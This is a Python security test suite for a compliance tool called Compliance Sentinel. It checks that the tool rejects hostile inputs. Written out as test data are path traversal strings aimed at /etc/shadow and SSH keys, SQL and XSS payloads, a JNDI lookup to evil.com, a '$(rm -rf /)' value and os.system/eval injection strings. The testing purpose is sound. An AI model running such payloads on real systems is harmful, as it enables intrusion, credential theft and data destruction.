"""Security testing framework for Compliance Sentinel."""

import pytest
import tempfile
import json
import os
from pathlib import Path
from typing import List, Dict, Any
import asyncio
from unittest.mock import patch, Mock

from compliance_sentinel.core.compliance_agent import ComplianceAgent
from compliance_sentinel.models.config import SystemConfiguration
from compliance_sentinel.utils.config_loader import ConfigLoader
from compliance_sentinel.config.config_manager import ConfigManager
from tests.fixtures.vulnerable_code_samples import VulnerableCodeSamples


class SecurityTestFramework:
    """Framework for security testing of Compliance Sentinel itself."""
    
    def __init__(self):
        """Initialize security test framework."""
        self.test_results = []
    
    async def run_all_security_tests(self) -> List[Dict[str, Any]]:
        """Run all security tests."""
        tests = [
            self.test_input_validation,
            self.test_path_traversal_protection,
            self.test_code_injection_protection,
            self.test_configuration_security,
            self.test_file_access_controls,
            self.test_memory_safety,
            self.test_error_information_disclosure,
            self.test_dependency_security,
            self.test_authentication_bypass,
            self.test_privilege_escalation
        ]
        
        results = []
        for test in tests:
            try:
                result = await test()
                results.append(result)
                print(f"✅ {result['test_name']}: {result['status']}")
            except Exception as e:
                results.append({
                    'test_name': test.__name__,
                    'status': 'FAILED',
                    'error': str(e),
                    'severity': 'HIGH'
                })
                print(f"❌ {test.__name__}: {e}")
        
        self.test_results = results
        return results
    
    async def test_input_validation(self) -> Dict[str, Any]:
        """Test input validation and sanitization."""
        test_cases = [
            # Path traversal attempts
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            
            # Code injection attempts
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}",
            "$(rm -rf /)",
            
            # Buffer overflow attempts
            "A" * 10000,
            "\x00" * 1000,
            
            # Unicode and encoding attacks
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",
            "..%252f..%252f..%252fetc%252fpasswd",
            
            # Null byte injection
            "file.txt\x00.exe",
            "config.json\x00malicious.py"
        ]
        
        vulnerabilities = []
        
        for malicious_input in test_cases:
            try:
                # Test file path validation
                config_manager = ConfigManager()
                
                # Try to create config with malicious path
                try:
                    config_manager.config_dir = Path(malicious_input)
                    # This should be safely handled
                except Exception:
                    pass  # Expected to fail safely
                
                # Test analysis with malicious file paths
                config = SystemConfiguration()
                config.hooks_enabled = False
                
                async with ComplianceAgent(config) as agent:
                    try:
                        # This should safely reject malicious paths
                        result = await agent.analyze_files([malicious_input])
                        if result.success:
                            # If it succeeds, check if it actually accessed the malicious path
                            if os.path.exists(malicious_input):
                                vulnerabilities.append(f"Path traversal possible: {malicious_input}")
                    except Exception:
                        pass  # Expected to fail safely
                        
            except Exception as e:
                # Unexpected errors might indicate vulnerabilities
                if "permission denied" not in str(e).lower():
                    vulnerabilities.append(f"Unexpected error with input '{malicious_input}': {e}")
        
        return {
            'test_name': 'Input Validation',
            'status': 'PASSED' if not vulnerabilities else 'FAILED',
            'vulnerabilities': vulnerabilities,
            'severity': 'HIGH' if vulnerabilities else 'LOW',
            'description': 'Tests input validation and sanitization against various attack vectors'
        }
    
    async def test_path_traversal_protection(self) -> Dict[str, Any]:
        """Test protection against path traversal attacks."""
        vulnerabilities = []
        
        # Test configuration file access
        config_manager = ConfigManager()
        
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "../../../../root/.ssh/id_rsa",
            "..\\..\\..\\..\\Users\\Administrator\\Desktop\\secrets.txt"
        ]
        
        for malicious_path in malicious_paths:
            try:
                # Try to load config from malicious path
                config_manager.local_config_file = Path(malicious_path)
                config = config_manager.load_project_config()
                
                # If this succeeds and actually reads a system file, it's a vulnerability
                if config.project_name != "default":
                    vulnerabilities.append(f"Path traversal in config loading: {malicious_path}")
                    
            except Exception:
                pass  # Expected to fail safely
        
        # Test file analysis path traversal
        config = SystemConfiguration()
        config.hooks_enabled = False
        
        async with ComplianceAgent(config) as agent:
            for malicious_path in malicious_paths:
                try:
                    result = await agent.analyze_files([malicious_path])
                    # Check if it actually tried to analyze system files
                    if result.success and result.total_issues > 0:
                        vulnerabilities.append(f"Path traversal in file analysis: {malicious_path}")
                except Exception:
                    pass  # Expected to fail safely
        
        return {
            'test_name': 'Path Traversal Protection',
            'status': 'PASSED' if not vulnerabilities else 'FAILED',
            'vulnerabilities': vulnerabilities,
            'severity': 'HIGH' if vulnerabilities else 'LOW',
            'description': 'Tests protection against path traversal attacks'
        }
    
    async def test_code_injection_protection(self) -> Dict[str, Any]:
        """Test protection against code injection attacks."""
        vulnerabilities = []
        
        # Test malicious code in configuration
        malicious_configs = [
            {
                "project_name": "__import__('os').system('echo vulnerable')",
                "custom_rules": [
                    {
                        "rule_id": "eval('__import__(\"os\").system(\"echo test\")')",
                        "name": "test",
                        "description": "test",
                        "severity": "high"
                    }
                ]
            },
            {
                "project_name": "${jndi:ldap://evil.com/a}",
                "description": "{{7*7}}"  # Template injection
            }
        ]
        
        for malicious_config in malicious_configs:
            try:
                with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
                    json.dump(malicious_config, f)
                    temp_file = f.name
                
                try:
                    config_manager = ConfigManager()
                    success = config_manager.import_config(Path(temp_file))
                    
                    if success:
                        # Check if malicious code was executed
                        config = config_manager.load_project_config()
                        if "vulnerable" in config.project_name or "49" in config.description:
                            vulnerabilities.append("Code injection in configuration processing")
                            
                finally:
                    Path(temp_file).unlink(missing_ok=True)
                    
            except Exception:
                pass  # Expected to fail safely
        
        # Test malicious code in analysis input
        malicious_code_samples = [
            "__import__('os').system('echo vulnerable')",
            "eval('print(\"code injection\")')",
            "exec('import os; os.system(\"echo test\")')",
            "${jndi:ldap://evil.com/exploit}"
        ]
        
        for malicious_code in malicious_code_samples:
            try:
                with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                    f.write(malicious_code)
                    temp_file = f.name
                
                try:
                    config = SystemConfiguration()
                    config.hooks_enabled = False
                    
                    async with ComplianceAgent(config) as agent:
                        result = await agent.analyze_files([temp_file])
                        # Analysis should complete safely without executing the code
                        
                finally:
                    Path(temp_file).unlink(missing_ok=True)
                    
            except Exception as e:
                # Check if error indicates code execution
                if "vulnerable" in str(e) or "code injection" in str(e):
                    vulnerabilities.append(f"Code injection during analysis: {e}")
        
        return {
            'test_name': 'Code Injection Protection',
            'status': 'PASSED' if not vulnerabilities else 'FAILED',
            'vulnerabilities': vulnerabilities,
            'severity': 'CRITICAL' if vulnerabilities else 'LOW',
            'description': 'Tests protection against code injection attacks'
        }
    
    async def test_configuration_security(self) -> Dict[str, Any]:
        """Test configuration security."""
        vulnerabilities = []
        
        # Test configuration file permissions
        config_manager = ConfigManager()
        
        # Create test config file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
            f.write("project_name: test\nsecret_key: sensitive_data")
            temp_config = f.name
        
        try:
            # Check if config files are created with secure permissions
            config_manager.import_config(Path(temp_config))
            
            # Check permissions of created config files
            if config_manager.project_config_file.exists():
                stat_info = config_manager.project_config_file.stat()
                # Check if file is readable by others (security issue)
                if stat_info.st_mode & 0o044:  # World or group readable
                    vulnerabilities.append("Configuration files have insecure permissions")
            
        finally:
            Path(temp_config).unlink(missing_ok=True)
        
        # Test configuration validation bypass
        invalid_configs = [
            {"project_name": ""},  # Invalid but might bypass validation
            {"severity_thresholds": {"critical_threshold": -1}},  # Invalid values
            {"mcp_servers": [{"server_name": "", "endpoint_url": "not-a-url"}]}  # Invalid server config
        ]
        
        for invalid_config in invalid_configs:
            try:
                with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
                    json.dump(invalid_config, f)
                    temp_file = f.name
                
                try:
                    config_manager = ConfigManager()
                    success = config_manager.import_config(Path(temp_file))
                    
                    if success:
                        # Invalid config was accepted - potential security issue
                        vulnerabilities.append(f"Invalid configuration accepted: {invalid_config}")
                        
                finally:
                    Path(temp_file).unlink(missing_ok=True)
                    
            except Exception:
                pass  # Expected to fail
        
        return {
            'test_name': 'Configuration Security',
            'status': 'PASSED' if not vulnerabilities else 'FAILED',
            'vulnerabilities': vulnerabilities,
            'severity': 'MEDIUM' if vulnerabilities else 'LOW',
            'description': 'Tests configuration file security and validation'
        }
    
    async def test_file_access_controls(self) -> Dict[str, Any]:
        """Test file access controls."""
        vulnerabilities = []
        
        # Test access to system files
        system_files = [
            "/etc/passwd",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "/proc/version",
            "/sys/class/dmi/id/product_uuid"
        ]
        
        config = SystemConfiguration()
        config.hooks_enabled = False
        
        async with ComplianceAgent(config) as agent:
            for system_file in system_files:
                if os.path.exists(system_file):
                    try:
                        result = await agent.analyze_files([system_file])
                        if result.success:
                            vulnerabilities.append(f"Unauthorized access to system file: {system_file}")
                    except PermissionError:
                        pass  # Expected
                    except Exception as e:
                        if "permission" not in str(e).lower():
                            vulnerabilities.append(f"Unexpected access to {system_file}: {e}")
        
        # Test directory traversal in file operations
        with tempfile.TemporaryDirectory() as temp_dir:
            # Create a file outside the temp directory
            outside_file = Path(temp_dir).parent / "outside_file.txt"
            outside_file.write_text("sensitive data")
            
            try:
                # Try to access file outside allowed directory
                traversal_path = str(Path(temp_dir) / ".." / "outside_file.txt")
                
                async with ComplianceAgent(config) as agent:
                    result = await agent.analyze_files([traversal_path])
                    if result.success and result.total_issues > 0:
                        vulnerabilities.append("Directory traversal allowed in file access")
                        
            finally:
                outside_file.unlink(missing_ok=True)
        
        return {
            'test_name': 'File Access Controls',
            'status': 'PASSED' if not vulnerabilities else 'FAILED',
            'vulnerabilities': vulnerabilities,
            'severity': 'HIGH' if vulnerabilities else 'LOW',
            'description': 'Tests file access controls and permissions'
        }
    
    async def test_memory_safety(self) -> Dict[str, Any]:
        """Test memory safety and resource limits."""
        vulnerabilities = []
        
        # Test large input handling
        large_inputs = [
            "A" * 1000000,  # 1MB string
            "B" * 10000000,  # 10MB string
            "\n".join(["line " + str(i) for i in range(100000)])  # Many lines
        ]
        
        config = SystemConfiguration()
        config.hooks_enabled = False
        
        for large_input in large_inputs:
            try:
                with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                    f.write(large_input)
                    temp_file = f.name
                
                try:
                    async with ComplianceAgent(config) as agent:
                        # This should handle large inputs gracefully
                        result = await agent.analyze_files([temp_file])
                        
                        # Check if memory usage is reasonable
                        import psutil
                        process = psutil.Process()
                        memory_mb = process.memory_info().rss / 1024 / 1024
                        
                        if memory_mb > 1000:  # More than 1GB
                            vulnerabilities.append(f"Excessive memory usage: {memory_mb:.1f}MB")
                            
                finally:
                    Path(temp_file).unlink(missing_ok=True)
                    
            except MemoryError:
                vulnerabilities.append("Memory exhaustion vulnerability")
            except Exception:
                pass  # Other errors are acceptable
        
        # Test resource exhaustion protection
        try:
            # Try to create many concurrent analyses
            config = SystemConfiguration()
            config.hooks_enabled = False
            config.max_concurrent_analyses = 1000  # Unreasonably high
            
            async with ComplianceAgent(config) as agent:
                # This should be limited by the system
                tasks = []
                for i in range(100):
                    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                        f.write(f"# Test file {i}")
                        task = agent.analyze_files([f.name])
                        tasks.append(task)
                
                # Should handle this gracefully
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                # Clean up temp files
                for i, task in enumerate(tasks):
                    temp_file = f"/tmp/tmp{i}.py"  # Approximate cleanup
                    Path(temp_file).unlink(missing_ok=True)
                
        except Exception as e:
            if "resource" in str(e).lower() or "limit" in str(e).lower():
                pass  # Expected resource limiting
            else:
                vulnerabilities.append(f"Resource exhaustion handling issue: {e}")
        
        return {
            'test_name': 'Memory Safety',
            'status': 'PASSED' if not vulnerabilities else 'FAILED',
            'vulnerabilities': vulnerabilities,
            'severity': 'MEDIUM' if vulnerabilities else 'LOW',
            'description': 'Tests memory safety and resource limits'
        }
    
    async def test_error_information_disclosure(self) -> Dict[str, Any]:
        """Test for information disclosure in error messages."""
        vulnerabilities = []
        
        # Test error messages for sensitive information
        config = SystemConfiguration()
        config.hooks_enabled = False
        
        # Try to trigger various error conditions
        error_triggers = [
            "/nonexistent/path/file.py",
            "/root/.ssh/id_rsa",
            "invalid://protocol/file",
            "\x00invalid\x00file\x00name"
        ]
        
        async with ComplianceAgent(config) as agent:
            for trigger in error_triggers:
                try:
                    result = await agent.analyze_files([trigger])
                    
                    # Check error messages for sensitive information
                    if result.error_message:
                        sensitive_patterns = [
                            "/home/",
                            "/root/",
                            "C:\\Users\\",
                            "password",
                            "secret",
                            "key",
                            "token"
                        ]
                        
                        for pattern in sensitive_patterns:
                            if pattern.lower() in result.error_message.lower():
                                vulnerabilities.append(f"Sensitive information in error: {pattern}")
                                
                except Exception as e:
                    # Check exception messages
                    error_msg = str(e)
                    if any(pattern in error_msg.lower() for pattern in ["password", "secret", "key", "/home/", "/root/"]):
                        vulnerabilities.append(f"Sensitive information in exception: {error_msg[:100]}")
        
        return {
            'test_name': 'Error Information Disclosure',
            'status': 'PASSED' if not vulnerabilities else 'FAILED',
            'vulnerabilities': vulnerabilities,
            'severity': 'MEDIUM' if vulnerabilities else 'LOW',
            'description': 'Tests for information disclosure in error messages'
        }
    
    async def test_dependency_security(self) -> Dict[str, Any]:
        """Test dependency security."""
        vulnerabilities = []
        
        # This would normally check for known vulnerable dependencies
        # For testing purposes, we'll simulate some checks
        
        try:
            import pkg_resources
            
            # Check for known vulnerable packages (simplified)
            vulnerable_packages = {
                "pyyaml": ["5.3.0", "5.2.0"],  # Known vulnerable versions
                "requests": ["2.19.1", "2.18.0"],
                "django": ["3.2.4", "3.1.0"]
            }
            
            installed_packages = {pkg.project_name.lower(): pkg.version 
                                for pkg in pkg_resources.working_set}
            
            for package, vulnerable_versions in vulnerable_packages.items():
                if package in installed_packages:
                    if installed_packages[package] in vulnerable_versions:
                        vulnerabilities.append(f"Vulnerable dependency: {package} {installed_packages[package]}")
                        
        except ImportError:
            pass  # pkg_resources not available
        
        return {
            'test_name': 'Dependency Security',
            'status': 'PASSED' if not vulnerabilities else 'FAILED',
            'vulnerabilities': vulnerabilities,
            'severity': 'HIGH' if vulnerabilities else 'LOW',
            'description': 'Tests for vulnerable dependencies'
        }
    
    async def test_authentication_bypass(self) -> Dict[str, Any]:
        """Test for authentication bypass vulnerabilities."""
        vulnerabilities = []
        
        # Test MCP server authentication
        from compliance_sentinel.mcp_server.server import MCPServer
        
        try:
            # Test without authentication
            server = MCPServer()
            
            # Try to access protected endpoints without auth
            # This is a simplified test - in reality would test actual HTTP endpoints
            
            # For now, just check if authentication is properly configured
            if not hasattr(server, 'auth_required') or not server.auth_required:
                vulnerabilities.append("MCP server may not require authentication")
                
        except Exception:
            pass  # Expected if server can't start
        
        return {
            'test_name': 'Authentication Bypass',
            'status': 'PASSED' if not vulnerabilities else 'FAILED',
            'vulnerabilities': vulnerabilities,
            'severity': 'HIGH' if vulnerabilities else 'LOW',
            'description': 'Tests for authentication bypass vulnerabilities'
        }
    
    async def test_privilege_escalation(self) -> Dict[str, Any]:
        """Test for privilege escalation vulnerabilities."""
        vulnerabilities = []
        
        # Test file creation permissions
        config_manager = ConfigManager()
        
        try:
            # Try to create files in system directories
            system_dirs = ["/etc", "/root", "C:\\Windows\\System32"]
            
            for sys_dir in system_dirs:
                if os.path.exists(sys_dir):
                    try:
                        test_file = Path(sys_dir) / "compliance_test.txt"
                        config_manager.config_dir = Path(sys_dir)
                        
                        # This should fail due to permissions
                        config = config_manager.create_default_config("test")
                        success = config_manager.save_project_config(config)
                        
                        if success and test_file.exists():
                            vulnerabilities.append(f"Privilege escalation: created file in {sys_dir}")
                            test_file.unlink(missing_ok=True)
                            
                    except PermissionError:
                        pass  # Expected
                    except Exception as e:
                        if "permission" not in str(e).lower():
                            vulnerabilities.append(f"Unexpected privilege behavior: {e}")
        
        except Exception:
            pass  # Expected to fail in most cases
        
        return {
            'test_name': 'Privilege Escalation',
            'status': 'PASSED' if not vulnerabilities else 'FAILED',
            'vulnerabilities': vulnerabilities,
            'severity': 'CRITICAL' if vulnerabilities else 'LOW',
            'description': 'Tests for privilege escalation vulnerabilities'
        }
    
    def generate_security_report(self) -> str:
        """Generate security test report."""
        if not self.test_results:
            return "No security test results available."
        
        report = ["# Compliance Sentinel Security Test Report\n"]
        report.append(f"Generated at: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        report.append("=" * 60 + "\n")
        
        # Summary
        total_tests = len(self.test_results)
        passed_tests = len([r for r in self.test_results if r['status'] == 'PASSED'])
        failed_tests = total_tests - passed_tests
        
        report.append("## Summary\n")
        report.append(f"- **Total Tests**: {total_tests}")
        report.append(f"- **Passed**: {passed_tests}")
        report.append(f"- **Failed**: {failed_tests}")
        report.append(f"- **Success Rate**: {passed_tests/total_tests:.1%}\n")
        
        # Failed tests
        if failed_tests > 0:
            report.append("## ⚠️ Failed Security Tests\n")
            for result in self.test_results:
                if result['status'] == 'FAILED':
                    report.append(f"### {result['test_name']} - {result['severity']}")
                    report.append(f"**Status**: {result['status']}")
                    
                    if 'vulnerabilities' in result:
                        report.append("**Vulnerabilities Found**:")
                        for vuln in result['vulnerabilities']:
                            report.append(f"- {vuln}")
                    
                    if 'error' in result:
                        report.append(f"**Error**: {result['error']}")
                    
                    report.append("")
        
        # All test details
        report.append("## Detailed Results\n")
        for result in self.test_results:
            status_emoji = "✅" if result['status'] == 'PASSED' else "❌"
            report.append(f"### {status_emoji} {result['test_name']}")
            report.append(f"- **Status**: {result['status']}")
            report.append(f"- **Severity**: {result['severity']}")
            report.append(f"- **Description**: {result['description']}")
            
            if result['status'] == 'FAILED' and 'vulnerabilities' in result:
                report.append(f"- **Vulnerabilities**: {len(result['vulnerabilities'])}")
            
            report.append("")
        
        return "\n".join(report)


# Pytest integration
@pytest.mark.security
class TestSecurityFramework:
    """Security tests for pytest integration."""
    
    @pytest.mark.asyncio
    async def test_input_validation_security(self):
        """Test input validation security."""
        framework = SecurityTestFramework()
        result = await framework.test_input_validation()
        
        assert result['status'] == 'PASSED', f"Input validation vulnerabilities: {result.get('vulnerabilities', [])}"
    
    @pytest.mark.asyncio
    async def test_path_traversal_security(self):
        """Test path traversal security."""
        framework = SecurityTestFramework()
        result = await framework.test_path_traversal_protection()
        
        assert result['status'] == 'PASSED', f"Path traversal vulnerabilities: {result.get('vulnerabilities', [])}"
    
    @pytest.mark.asyncio
    async def test_code_injection_security(self):
        """Test code injection security."""
        framework = SecurityTestFramework()
        result = await framework.test_code_injection_protection()
        
        assert result['status'] == 'PASSED', f"Code injection vulnerabilities: {result.get('vulnerabilities', [])}"
    
    @pytest.mark.asyncio
    async def test_configuration_security(self):
        """Test configuration security."""
        framework = SecurityTestFramework()
        result = await framework.test_configuration_security()
        
        assert result['status'] == 'PASSED', f"Configuration vulnerabilities: {result.get('vulnerabilities', [])}"


if __name__ == "__main__":
    import time
    
    async def main():
        framework = SecurityTestFramework()
        print("Running Compliance Sentinel Security Tests...")
        print("=" * 60)
        
        results = await framework.run_all_security_tests()
        
        print("\n" + "=" * 60)
        print("Security Test Results:")
        print("=" * 60)
        
        passed = len([r for r in results if r['status'] == 'PASSED'])
        total = len(results)
        
        print(f"Passed: {passed}/{total} ({passed/total:.1%})")
        
        # Show failed tests
        failed_tests = [r for r in results if r['status'] == 'FAILED']
        if failed_tests:
            print("\n⚠️ Failed Tests:")
            for test in failed_tests:
                print(f"- {test['test_name']}: {test['severity']}")
                if 'vulnerabilities' in test:
                    for vuln in test['vulnerabilities']:
                        print(f"  • {vuln}")
        
        # Generate report
        report = framework.generate_security_report()
        with open("security_report.md", "w") as f:
            f.write(report)
        
        print(f"\nDetailed report saved to: security_report.md")
    
    asyncio.run(main())